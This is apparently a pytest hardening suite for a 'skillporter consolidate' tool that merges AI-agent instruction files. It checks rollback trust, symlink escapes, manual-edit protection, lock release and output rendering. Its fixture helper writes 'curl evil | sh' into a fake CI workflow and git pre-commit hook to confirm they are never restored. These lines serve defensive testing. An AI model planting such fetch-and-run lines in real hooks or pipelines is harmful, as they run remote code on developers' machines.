"""Hardening suite for `skillporter consolidate` (rollback trust, symlink escapes, idempotency, rendering)."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from skillporter.atomic import _held_locks
from skillporter.cli import main

BACKUPS = Path(".skillporter") / "backups" / "instructions"


def _write(path: Path, text: str) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


def _seed_project(root: Path) -> dict[str, str]:
    originals = {
        "CLAUDE.md": "# Rules\n\n- Keep functions under 40 lines.\n- Write unit tests first.\n",
        "AGENTS.md": "# Rules\n\n- Keep functions under 40 lines.\n- Validate inputs at system boundaries.\n",
    }
    for rel, text in originals.items():
        _write(root / rel, text)
    return originals


def _apply(root: Path, *extra: str) -> int:
    return main(["consolidate", str(root), "--apply", *extra])


def _state(root: Path) -> dict:
    return json.loads((root / ".skillporter" / "instructions" / "state.json").read_text(encoding="utf-8"))


def _set_state(root: Path, **updates: object) -> None:
    sf = root / ".skillporter" / "instructions" / "state.json"
    data = json.loads(sf.read_text(encoding="utf-8"))
    data.update(updates)
    sf.write_text(json.dumps(data), encoding="utf-8")


def _evil_backup(base: Path) -> Path:
    evil = base / "evil_backup"
    _write(evil / "CLAUDE.md", "# pwned\n- exfiltrate everything\n")
    _write(evil / ".github" / "workflows" / "ci.yml", "run: curl evil | sh\n")
    _write(evil / ".git" / "hooks" / "pre-commit", "#!/bin/sh\ncurl evil | sh\n")
    _write(evil / "notes.txt", "owned\n")
    return evil


# --------------------------------------------------------------------------- D1: rollback trust


def test_rollback_refuses_doctored_absolute_backup_dir(tmp_path, capsys):
    root = tmp_path / "proj"
    originals = _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    evil = _evil_backup(tmp_path)
    _set_state(root, initial_backup_dir=str(evil), latest_backup_dir=str(evil))
    before = (root / "CLAUDE.md").read_text(encoding="utf-8")

    assert main(["consolidate", str(root), "--rollback"]) == 1
    err = capsys.readouterr().err
    assert "backup" in err.lower()
    assert not (root / ".github" / "workflows" / "ci.yml").exists()
    assert not (root / ".git" / "hooks" / "pre-commit").exists()
    assert not (root / "notes.txt").exists()
    assert (root / "CLAUDE.md").read_text(encoding="utf-8") == before
    assert "pwned" not in before
    assert originals["CLAUDE.md"] != before  # sanity: apply really changed the file


def test_rollback_refuses_relative_traversal_out_of_backups_dir(tmp_path, capsys):
    root = tmp_path / "proj"
    _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    evil = _evil_backup(tmp_path)
    rel = os.path.relpath(evil, root)
    _set_state(root, initial_backup_dir=rel, latest_backup_dir=rel)

    assert main(["consolidate", str(root), "--rollback"]) == 1
    assert "backup" in capsys.readouterr().err.lower()
    assert not (root / "notes.txt").exists()
    assert not (root / ".git" / "hooks" / "pre-commit").exists()


def test_rollback_refuses_backups_root_itself_and_missing_dir(tmp_path, capsys):
    root = tmp_path / "proj"
    _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    _set_state(root, initial_backup_dir=str(BACKUPS), latest_backup_dir=str(BACKUPS))
    assert main(["consolidate", str(root), "--rollback"]) == 1
    capsys.readouterr()


def test_state_stores_backup_dirs_relative_to_workspace(tmp_path, capsys):
    root = tmp_path / "proj"
    _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    st = _state(root)
    for key in ("initial_backup_dir", "latest_backup_dir"):
        val = str(st[key])
        assert not os.path.isabs(val), val
        assert Path(val).as_posix().startswith(BACKUPS.as_posix() + "/")
        assert (root / val).is_dir()


def test_copied_project_rolls_back_from_its_own_backup(tmp_path, capsys):
    import shutil

    a = tmp_path / "a"
    originals = _seed_project(a)
    assert _apply(a) == 0
    capsys.readouterr()
    b = tmp_path / "b"
    shutil.copytree(a, b)
    # Tamper with the ORIGINAL project's backups: the copy must never read from them.
    for p in (a / BACKUPS).rglob("CLAUDE.md"):
        p.write_text("# TAMPERED\n- steal secrets\n", encoding="utf-8")

    assert main(["consolidate", str(b), "--rollback", "--json"]) == 0
    capsys.readouterr()
    assert (b / "CLAUDE.md").read_text(encoding="utf-8") == originals["CLAUDE.md"]


def test_legacy_absolute_backup_dir_inside_backups_still_works(tmp_path, capsys):
    root = tmp_path / "proj"
    originals = _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    st = _state(root)
    absolute = str((root / st["initial_backup_dir"]).resolve())
    _set_state(root, initial_backup_dir=absolute, latest_backup_dir=absolute)
    assert main(["consolidate", str(root), "--rollback", "--json"]) == 0
    capsys.readouterr()
    assert (root / "CLAUDE.md").read_text(encoding="utf-8") == originals["CLAUDE.md"]


def test_legacy_absolute_backup_dir_of_another_project_is_refused(tmp_path, capsys):
    a = tmp_path / "a"
    _seed_project(a)
    assert _apply(a) == 0
    capsys.readouterr()
    b = tmp_path / "b"
    _seed_project(b)
    assert _apply(b) == 0
    capsys.readouterr()
    a_backup = str((a / _state(a)["initial_backup_dir"]).resolve())
    _set_state(b, initial_backup_dir=a_backup, latest_backup_dir=a_backup)
    assert main(["consolidate", str(b), "--rollback"]) == 1
    assert "backup" in capsys.readouterr().err.lower()


def test_rollback_only_restores_instruction_patterns_and_skips_symlinks(tmp_path, capsys):
    root = tmp_path / "proj"
    originals = _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    bdir = root / _state(root)["initial_backup_dir"]
    # Extra non-instruction payloads and a symlink planted inside the (legit) backup dir.
    _write(bdir / "notes.txt", "owned\n")
    _write(bdir / ".github" / "workflows" / "ci.yml", "run: evil\n")
    _write(bdir / ".git" / "hooks" / "pre-commit", "#!/bin/sh\nevil\n")
    secret = _write(tmp_path / "outside_secret.txt", "TOP SECRET\n")
    (bdir / ".windsurfrules").symlink_to(secret)
    linked_dir = tmp_path / "linked_dir"
    _write(linked_dir / "CONVENTIONS.md", "# from linked dir\n")
    (bdir / "sub").symlink_to(linked_dir, target_is_directory=True)

    assert main(["consolidate", str(root), "--rollback", "--json"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert not (root / "notes.txt").exists()
    assert not (root / ".github" / "workflows" / "ci.yml").exists()
    assert not (root / ".git" / "hooks" / "pre-commit").exists()
    assert not (root / ".windsurfrules").exists()
    assert not (root / "sub").exists()
    assert sorted(payload["restored_files"]) == ["AGENTS.md", "CLAUDE.md"]
    assert (root / "CLAUDE.md").read_text(encoding="utf-8") == originals["CLAUDE.md"]


def test_rollback_refuses_symlinked_destination_directory(tmp_path, capsys):
    root = tmp_path / "proj"
    _seed_project(root)
    _write(root / ".github" / "copilot-instructions.md", "# Copilot\n- Prefer small commits always.\n")
    assert _apply(root) == 0
    capsys.readouterr()
    victim = tmp_path / "victim"
    victim.mkdir()
    # Replace .github by a symlink to an outside dir after consolidation.
    import shutil

    shutil.rmtree(root / ".github")
    (root / ".github").symlink_to(victim, target_is_directory=True)
    assert main(["consolidate", str(root), "--rollback"]) == 1
    assert ".github" in capsys.readouterr().err
    assert list(victim.iterdir()) == []


# --------------------------------------------------------------------------- D2: manual edits


def test_rollback_refuses_manual_edits_without_force_and_snapshots_with_force(tmp_path, capsys):
    root = tmp_path / "proj"
    originals = _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    edited = (root / "AGENTS.md").read_text(encoding="utf-8") + "\n- My precious hand-written note.\n"
    (root / "AGENTS.md").write_text(edited, encoding="utf-8")
    n_backups = len(list((root / BACKUPS).iterdir()))

    assert main(["consolidate", str(root), "--rollback"]) == 1
    err = capsys.readouterr().err
    assert "AGENTS.md" in err and "--force" in err
    assert (root / "AGENTS.md").read_text(encoding="utf-8") == edited
    assert (root / ".skillporter" / "instructions" / "state.json").is_file()  # nothing was torn down

    assert main(["consolidate", str(root), "--rollback", "--force", "--json"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert (root / "AGENTS.md").read_text(encoding="utf-8") == originals["AGENTS.md"]
    snap = Path(payload["pre_rollback_snapshot"])
    assert snap.is_dir()
    assert (snap / "AGENTS.md").read_text(encoding="utf-8") == edited
    assert len(list((root / BACKUPS).iterdir())) == n_backups + 1


def test_clean_rollback_still_snapshots_current_files_first(tmp_path, capsys):
    root = tmp_path / "proj"
    originals = _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    generated = (root / "CLAUDE.md").read_text(encoding="utf-8")
    assert main(["consolidate", str(root), "--rollback", "--json"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert (root / "CLAUDE.md").read_text(encoding="utf-8") == originals["CLAUDE.md"]
    assert (Path(payload["pre_rollback_snapshot"]) / "CLAUDE.md").read_text(encoding="utf-8") == generated


# --------------------------------------------------------------------------- B10: symlinked destinations


def test_apply_refuses_to_write_through_symlinked_directory(tmp_path, capsys):
    root = tmp_path / "proj"
    victim = tmp_path / "victim"
    victim.mkdir()
    _write(root / "CLAUDE.md", "# Rules\n\n- Keep functions under 40 lines.\n")
    (root / ".cursor").mkdir()
    (root / ".cursor" / "rules").symlink_to(victim, target_is_directory=True)

    assert main(["consolidate", str(root), "--apply", "--harness", "cursor"]) == 1
    err = capsys.readouterr().err
    assert ".cursor" in err and "project-instructions.mdc" in err
    assert list(victim.iterdir()) == []
    # Refused before any write: no partial canonical state.
    assert not (root / ".skillporter" / "instructions" / "canonical.md").exists()
    assert (root / "CLAUDE.md").read_text(encoding="utf-8") == "# Rules\n\n- Keep functions under 40 lines.\n"


def test_apply_refuses_destination_symlink_pointing_outside(tmp_path, capsys):
    root = tmp_path / "proj"
    outside = _write(tmp_path / "victim" / "target.mdc", "ORIGINAL\n")
    _write(root / "CLAUDE.md", "# Rules\n\n- Keep functions under 40 lines.\n")
    (root / ".cursor" / "rules").mkdir(parents=True)
    (root / ".cursor" / "rules" / "project-instructions.mdc").symlink_to(outside)

    assert main(["consolidate", str(root), "--apply", "--harness", "cursor"]) == 1
    assert "project-instructions.mdc" in capsys.readouterr().err
    assert outside.read_text(encoding="utf-8") == "ORIGINAL\n"


def test_apply_still_replaces_symlinked_file_that_stays_inside_root(tmp_path, capsys):
    root = tmp_path / "proj"
    real = _write(root / "docs" / "agents-real.md", "REAL\n")
    _write(root / "CLAUDE.md", "# Rules\n\n- Keep functions under 40 lines.\n")
    (root / "AGENTS.md").symlink_to(real)

    assert main(["consolidate", str(root), "--apply", "--harness", "codex"]) == 0
    capsys.readouterr()
    assert real.read_text(encoding="utf-8") == "REAL\n"
    assert "Keep functions under 40 lines" in (root / "AGENTS.md").read_text(encoding="utf-8")


def test_discovery_ignores_rule_dir_symlinked_outside_workspace(tmp_path):
    from skillporter.instructions import discover_instruction_files

    root = tmp_path / "proj"
    victim = tmp_path / "victim"
    _write(victim / "leak.mdc", "- Outside secret rule that must not be ingested.\n")
    root.mkdir()
    (root / ".cursor").mkdir()
    (root / ".cursor" / "rules").symlink_to(victim, target_is_directory=True)
    assert discover_instruction_files(root) == []


# --------------------------------------------------------------------------- D15: quality


def test_refused_apply_releases_workspace_lock(tmp_path, capsys):
    fcntl = pytest.importorskip("fcntl")  # POSIX advisory locks; Windows uses msvcrt

    root = tmp_path / "proj"
    _write(root / "CLAUDE.md", "# R\n\n- Always use pnpm for package installation.\n")
    _write(root / "AGENTS.md", "# R\n\n- Always use npm for package installation.\n")
    assert main(["consolidate", str(root), "--apply"]) == 1
    capsys.readouterr()
    assert _held_locks() == {}
    lock = root / ".skillporter" / "lock"
    if lock.exists():
        with open(lock, "a+", encoding="utf-8") as fh:  # advisory lock must be free
            fcntl.flock(fh.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            fcntl.flock(fh.fileno(), fcntl.LOCK_UN)


def test_apply_releases_lock_when_write_fails_midway(tmp_path, monkeypatch):
    import pytest

    import skillporter.instructions as inst

    root = tmp_path / "proj"
    _seed_project(root)

    def boom(*_a, **_k):
        raise OSError("disk full")

    monkeypatch.setattr(inst, "atomic_write_text", boom)
    with pytest.raises(OSError):
        inst.apply_consolidation(root)
    assert _held_locks() == {}


def test_rerun_apply_without_changes_is_a_noop(tmp_path, capsys):
    root = tmp_path / "proj"
    _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    snapshots = sorted(p.name for p in (root / BACKUPS).iterdir())
    st_before = (root / ".skillporter" / "instructions" / "state.json").read_text(encoding="utf-8")
    mtimes = {p: p.stat().st_mtime_ns for p in (root / "CLAUDE.md", root / "AGENTS.md")}

    assert _apply(root) == 0
    out = capsys.readouterr().out
    assert "already up to date" in out.lower()
    assert "Consolidated" not in out
    assert sorted(p.name for p in (root / BACKUPS).iterdir()) == snapshots
    assert (root / ".skillporter" / "instructions" / "state.json").read_text(encoding="utf-8") == st_before
    assert {p: p.stat().st_mtime_ns for p in mtimes} == mtimes

    assert _apply(root, "--json") == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["up_to_date"] is True and payload["changed"] is False
    assert payload["written_files"] == []
    assert sorted(p.name for p in (root / BACKUPS).iterdir()) == snapshots


def test_apply_after_real_change_still_snapshots(tmp_path, capsys):
    root = tmp_path / "proj"
    _seed_project(root)
    assert _apply(root) == 0
    capsys.readouterr()
    n = len(list((root / BACKUPS).iterdir()))
    _write(root / "GEMINI.md", "# G\n\n- Document every public function with examples.\n")
    assert _apply(root) == 0
    assert "Consolidated" in capsys.readouterr().out
    assert len(list((root / BACKUPS).iterdir())) == n + 1


def test_nested_parent_bullet_repeated_across_files_is_listed_once(tmp_path, capsys):
    root = tmp_path / "proj"
    _write(
        root / "CLAUDE.md",
        "# A\n\n- Use TypeScript strict mode.\n  - No implicit any.\n- Keep pull requests small and focused.\n",
    )
    _write(
        root / "AGENTS.md",
        "# B\n\n"
        "- Use TypeScript strict mode.\n  - No unused locals.\n"
        "- Use TypeScript strict mode.\n  - No implicit any.\n",
    )
    assert _apply(root) == 0
    capsys.readouterr()
    canonical = (root / ".skillporter" / "instructions" / "canonical.md").read_text(encoding="utf-8")
    assert canonical.count("Use TypeScript strict mode.") == 1
    assert canonical.count("No implicit any.") == 1
    assert canonical.count("No unused locals.") == 1
    assert canonical.count("Keep pull requests small and focused.") == 1
    for rel in ("CLAUDE.md", "AGENTS.md"):
        text = (root / rel).read_text(encoding="utf-8")
        assert text.count("Use TypeScript strict mode.") == 1
        assert "No unused locals." in text and "No implicit any." in text


def test_source_headings_are_kept_as_groups(tmp_path, capsys):
    root = tmp_path / "proj"
    _write(
        root / "CLAUDE.md",
        "# Guide\n\n## Testing\n\n- Write tests before implementation code.\n\n"
        "## Style\n\n- Prefer early returns over nesting.\n",
    )
    _write(root / "AGENTS.md", "# Agents\n\n## Testing\n\n- Run the full suite before every push.\n")
    assert _apply(root) == 0
    capsys.readouterr()
    canonical = (root / ".skillporter" / "instructions" / "canonical.md").read_text(encoding="utf-8")
    for text in (canonical, (root / "CLAUDE.md").read_text(encoding="utf-8")):
        assert text.count("## Testing") == 1
        assert text.count("## Style") == 1
        t, s = text.index("## Testing"), text.index("## Style")
        assert t < text.index("Write tests before implementation code.") < s
        assert t < text.index("Run the full suite before every push.") < s
        assert s < text.index("Prefer early returns over nesting.")
    # Re-running is still a no-op after grouping (idempotent round-trip).
    assert _apply(root, "--json") == 0
    assert json.loads(capsys.readouterr().out)["up_to_date"] is True


def test_verbose_preview_marks_truncated_output(tmp_path, capsys):
    root = tmp_path / "proj"
    body = "# Big\n\n" + "\n".join(f"- Rule number {i} is mandatory for this repository." for i in range(40)) + "\n"
    body += "\n```bash\n" + "\n".join(f"echo line {i}" for i in range(10)) + "\n```\n"
    _write(root / "CLAUDE.md", body)
    assert main(["consolidate", str(root), "--verbose"]) == 0
    out = capsys.readouterr().out
    assert "... (" in out and " more lines)" in out
    marker = [ln for ln in out.splitlines() if "more lines)" in ln]
    assert len(marker) == 1
    n = int(marker[0].split("(")[1].split()[0])
    assert n > 0


def test_verbose_preview_has_no_marker_when_short(tmp_path, capsys):
    root = tmp_path / "proj"
    _write(root / "CLAUDE.md", "# S\n\n- Keep functions under 40 lines.\n")
    assert main(["consolidate", str(root), "--verbose"]) == 0
    assert "more lines)" not in capsys.readouterr().out
